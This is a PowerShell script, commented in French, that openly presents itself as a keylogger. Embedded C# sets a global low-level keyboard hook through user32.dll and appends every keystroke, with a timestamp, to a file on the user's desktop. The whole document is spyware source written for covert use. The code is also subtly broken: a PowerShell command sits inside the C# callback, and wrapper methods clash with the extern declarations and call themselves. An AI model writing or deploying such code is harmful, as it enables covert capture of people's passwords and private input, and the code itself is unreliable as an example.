# Script PowerShell pour créer un keylogger

# Chemin du fichier de sortie
$outputFile = "$env:USERPROFILE\Desktop\keylog.txt"

# Fonction pour enregistrer les frappes de clavier
function Log-KeyStroke {
    param (
        [string]$key
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $key" | Out-File -FilePath $outputFile -Append
}

# Fonction pour démarrer le keylogger
function Start-KeyLogger {
    Add-Type @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;

    public class GlobalKeyboardHook {
        private static IntPtr hookId = IntPtr.Zero;
        private static HookProc hookProc;

        public static void Start() {
            hookProc = HookCallback;
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                hookId = SetHook(hookProc);
                Application.Run();
                UnhookWindowsHookEx(hookId);
            }
        }

        private static IntPtr SetHook(HookProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                Log-KeyStroke -key $key
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId) {
            return SetWindowsHookEx(idHook, lpfn, hMod, dwThreadId);
        }

        private static void UnhookWindowsHookEx(IntPtr hHook) {
            UnhookWindowsHookEx(hHook);
        }

        private static IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam) {
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        private static IntPtr GetModuleHandle(string lpModuleName) {
            return GetModuleHandle(lpModuleName);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hHook);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
"@

    [GlobalKeyboardHook]::Start()
}

# Démarrer le keylogger
Start-KeyLogger
